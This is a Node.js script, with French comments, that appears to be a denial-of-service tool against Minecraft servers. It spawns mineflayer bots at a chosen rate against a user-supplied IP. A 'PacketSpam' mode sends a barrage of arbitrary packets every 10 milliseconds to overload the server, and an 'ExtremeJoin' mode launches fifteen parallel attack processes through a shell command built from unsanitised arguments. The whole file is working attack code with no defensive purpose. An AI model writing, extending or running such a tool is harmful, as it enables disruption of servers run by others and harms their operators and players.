process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
const fs = require('fs');
const mineflayer = require('mineflayer');
const { program } = require('commander');
const { exec } = require('child_process');
const path = require('path');

program
  .requiredOption('--ip <type>', 'Adresse IP du serveur')
  .requiredOption('--bps <type>', 'Bots par seconde')
  .requiredOption('--time <type>', 'Temps en secondes')
  .requiredOption('--protocol <type>', 'Protocole')
  .requiredOption('--method <type>', 'Méthode');

program.parse(process.argv);

const options = program.opts();
const legitNamesFile = path.resolve(__dirname, 'files/method/legitnames.txt');
const invalidNamesFile = path.resolve(__dirname, 'files/method/invalidnames.txt');

let legitNames = [];
let invalidNames = [];

try {
  legitNames = fs.readFileSync(legitNamesFile, 'utf8').split('\n').map(name => name.trim()).filter(name => name);
} catch (err) {
  console.error(`Erreur de lecture du fichier des noms valides : ${err.message}`);
  process.exit(1);
}

try {
  invalidNames = fs.readFileSync(invalidNamesFile, 'utf8').split('\n').map(name => name.trim()).filter(name => name);
} catch (err) {
  console.error(`Erreur de lecture du fichier des noms invalides : ${err.message}`);
  process.exit(1);
}

const getRandomName = (names) => {
  const randomIndex = Math.floor(Math.random() * names.length);
  return names[randomIndex];
};

const createBot = (index, retries = 0) => {
  const botOptions = {
    host: options.ip,
    port: 25565, // Port par défaut de Minecraft
    version: options.protocol,
    username: options.method === 'LegitNames' ? getRandomName(legitNames) :
              options.method === 'InvalidNames' ? getRandomName(invalidNames) :
              `kod_${index}`, // Nom unique pour chaque bot ou aléatoire
    skipValidation: true,
  };

  const bot = mineflayer.createBot(botOptions);

  bot.on('login', () => {
    console.log(`Bot connected: ${bot.username}`);
    if (options.method === 'Join') {
      // Ajouter des actions spécifiques à la méthode Join ici
    }

    if (options.method === 'PacketSpam') {
      // Envoie de paquets en continu pour surcharger le serveur
      setInterval(() => {
        // Paquet de chat
        bot._client.write('chat', { message: 'Spam packet' });
    
        // Paquet de mise à jour de position
        bot._client.write('position', {
          x: bot.entity.position.x + (Math.random() - 0.5), // Déplacement aléatoire
          y: bot.entity.position.y + (Math.random() - 0.5),
          z: bot.entity.position.z + (Math.random() - 0.5),
          onGround: Math.random() > 0.5 // Alterne la valeur de onGround
        });
    
        // Paquet de tenue d'objet (item held)
        bot._client.write('held_item_slot', {
          slot: Math.floor(Math.random() * 9) // Slot aléatoire de 0 à 8
        });
    
        // Paquet d'animation (bras balancé)
        bot._client.write('arm_animation', {
          hand: 0 // Main principale (main droite par défaut)
        });
    
        // Paquet de mise à jour des statistiques
        bot._client.write('client_command', {
          actionId: 1 // Action Respawn
        });
    
        // Paquet de mise à jour de la fenêtre d'inventaire
        bot._client.write('window_click', {
          windowId: 0,
          slot: Math.floor(Math.random() * 45), // Slot aléatoire de l'inventaire
          mouseButton: 0,
          action: 1,
          mode: 0,
          item: { present: false } // Aucun item sélectionné
        });
    
        // Paquet de mise à jour de l'état des entités
        bot._client.write('entity_action', {
          entityId: bot.entity.id,
          actionId: Math.floor(Math.random() * 6), // Action aléatoire entre 0 et 5
          jumpBoost: 0
        });
    
        // Paquet de mise à jour de la barre d'expérience
        bot._client.write('experience', {
          experienceBar: Math.random(), // Pourcentage d'expérience
          level: Math.floor(Math.random() * 100), // Niveau aléatoire
          totalExperience: Math.floor(Math.random() * 10000) // Expérience totale
        });
    
        // Paquet de mise à jour de la santé
        bot._client.write('update_health', {
          health: Math.random() * 20, // Santé aléatoire de 0 à 20
          food: Math.floor(Math.random() * 20), // Nourriture aléatoire de 0 à 20
          foodSaturation: Math.random() * 5 // Saturation alimentaire
        });
    
        // Paquet de ping de position
        bot._client.write('position_look', {
          x: bot.entity.position.x + (Math.random() - 0.5), 
          y: bot.entity.position.y + (Math.random() - 0.5),
          z: bot.entity.position.z + (Math.random() - 0.5),
          yaw: Math.random() * 360,
          pitch: Math.random() * 180 - 90,
          onGround: Math.random() > 0.5
        });
    
        // Paquet de l'interaction d'entité
        bot._client.write('use_entity', {
          target: bot.entity.id,
          mouse: Math.floor(Math.random() * 2), // 0: Interact, 1: Attack
          x: Math.random(),
          y: Math.random(),
          z: Math.random()
        });
    
        // Paquet de téléportation confirmée
        bot._client.write('teleport_confirm', {
          teleportId: Math.floor(Math.random() * 1000) // ID de téléportation aléatoire
        });
    
        // Paquet de client_settings (paramètres du client)
        bot._client.write('client_settings', {
          locale: 'en_US', // Langue
          viewDistance: 10, // Distance de vue
          chatFlags: 0,
          chatColors: true,
          skinParts: 127,
          mainHand: 1 // Main droite
        });
    
        // Paquet de mise à jour de la recette (relevant pour le client seulement)
        bot._client.write('update_command_block', {
          location: { x: 0, y: 0, z: 0 },
          command: '/help',
          mode: 0,
          flags: 0
        });
    
      }, 10); // Intervalle d'envoi des paquets, ajustez à la fréquence désirée
    }    
  });

  bot.on('end', () => {
    console.log(`Bot disconnected: ${bot.username}`);
    if (options.method === 'DoubleJoin' && retries < 2) {
      console.log(`Bot ${bot.username} is reconnecting... Attempt ${retries + 1}`);
      setTimeout(() => createBot(index, retries + 1), 5000); // Reconnecter après 5 secondes
    } else {
      console.log(`Bot ${bot.username} will not reconnect after ${retries} retries.`);
    }
  });

  bot.on('error', (err) => {
    console.log(`Error: ${err.message}`);
  });
};

const startBots = () => {
  const interval = 1000 / options.bps; // Corrige l'intervalle pour créer les bots correctement
  const totalBots = options.bps * options.time;
  let botsCreated = 0;

  const createBots = () => {
    if (botsCreated < totalBots) {
      createBot(botsCreated);
      botsCreated += 1;
      updateProgress();

      setTimeout(createBots, interval);
    }
  };

  const updateProgress = () => {
    const percentComplete = Math.min(100, (botsCreated / totalBots) * 100).toFixed(2);
    console.log(`Progress: ${percentComplete}% (${botsCreated}/${totalBots} bots créés)`);
  };

  console.log('Start of the attack...');
  createBots();
};

const botattackPath = path.resolve(__dirname, 'botattack.js');

if (options.method === 'ExtremeJoin') {
  for (let i = 0; i < 15; i++) {
    exec(`node "${botattackPath}" --ip ${options.ip} --bps ${options.bps} --time ${options.time} --protocol ${options.protocol} --method Join`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error executing botattack instance ${i + 1}: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`Error output from botattack instance ${i + 1}: ${stderr}`);
        return;
      }
      console.log(`Output from botattack instance ${i + 1}: ${stdout}`);
    });
  }
} else {
  startBots();
}
